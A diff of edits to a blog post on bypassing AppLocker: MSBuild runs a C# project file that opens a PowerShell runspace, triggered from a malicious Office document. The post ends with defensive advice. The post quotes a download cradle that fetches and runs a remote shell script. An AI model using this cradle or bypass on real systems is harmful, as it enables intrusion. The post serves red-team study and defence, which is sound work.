@@ -20,11 +20,11 @@ The post will document one such method, with (as Casey Smith puts it) the "mispl
 
 ![rules]({{ site.url }}/images/applocker-rules.png){: .center-image }
 
-However, assuming that MSBuild.exe is allowed, we can have it execute a ".csproj" (Visual Studio .NET C# Project file) and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.
+Assuming that MSBuild.exe is allowed, we can invoke it to execute a ".csproj" (Visual Studio .NET C# Project file) and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-This executes the second stage of our payload via a PowerShell 3.0+ download cradle:
+It then executes the second stage of our payload via a PowerShell 3.0+ download cradle:
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
@@ -48,15 +48,14 @@ Now that the "malicious" document has been created we can test it out. Once the 
 
 ![rules]({{ site.url }}/images/shell.png){: .center-image }
 
-
 We can see that this payload is also an effective means of bypassing PowerShell Contrained Language mode. This was not a particularly stealthy attack as the .csproj is written to disk, and no attempt was made to obfuscate any part of the payload.
 
-Hopefully, this example highlights the danger of "misplaced trust" binaries such as MSBuild. organisations should block their use unless explicitely required for certain users (e.g. developers). Organisations should also consider blocking macros for users who don't need this functionality, and consider implementing a custom whitelisting policy, mindful of the permissiveness of Default Rules. Oddvar Moe ([@Oddvarmoe](https://twitter.com/oddvarmoe)) maintains an excellent [collection](https://github.com/api0cradle/UltimateAppLockerByPassList) of AppLocker bypass techniques, which is a good list of the "misplaced trust" binaries that IT departments should consider blocking. In addition to powershell.exe, organisations should also consider blocking the following PowerShell binaries and assemblies.
+Hopefully, this example highlights the danger of "misplaced trust" binaries such as MSBuild. organisations should block their use unless explicitely required for certain users (e.g. developers). Organisations should also consider blocking Office Macros for users who don't need this functionality, and consider implementing a custom whitelisting policy, mindful of the permissiveness of Default Rules. Oddvar Moe ([@Oddvarmoe](https://twitter.com/oddvarmoe)) maintains an excellent [collection](https://github.com/api0cradle/UltimateAppLockerByPassList) of AppLocker bypass techniques, which is a good list of the "misplaced trust" binaries that IT departments should consider blocking. In addition to powershell.exe, organisations should also consider blocking the following PowerShell binaries and assemblies.
 
 <script src="https://gist.github.com/egre55/61b6cd2b23b605e6a017e81e5cb97f3e.js"></script>
 
-Yet, even after blocking the above, there are multiple methods an attacker could use to instantiate a Powershell runspace. For example, an attacker could download a custom binary to one of the writable and executable folders within Windows that is whitelisted by AppLocker Default Rules. On my computer, these are:
+Yet as mentioned, even after blocking the above, there are multiple methods an attacker could use to instantiate a Powershell runspace. For example, an attacker could download a custom binary to one of the writable and executable folders within Windows that are whitelisted by AppLocker Default Rules. On my computer, these are:
 
 <script src="https://gist.github.com/egre55/47186f7a22de177af4785e80fc2dcb41.js"></script>
 
-This attacker/defender back and forth continues ad infinitum. Therefore it is important for organisations to formalise an ongoing cycle of testing, remediation and review, in order to achieve stronger system security. Ultimately, an "assume breach" mentality is paramount, and to make it as hard as possible for an attacker to gain that initial foothold.
+This attacker/defender back and forth continues ad infinitum. Therefore, it is important for organisations to formalise an ongoing cycle of testing, remediation and review, in order to achieve stronger system security. An "assume breach" mentality is also useful, as well as focusing on efforts to make it as hard as possible for an attacker to gain that initial foothold.
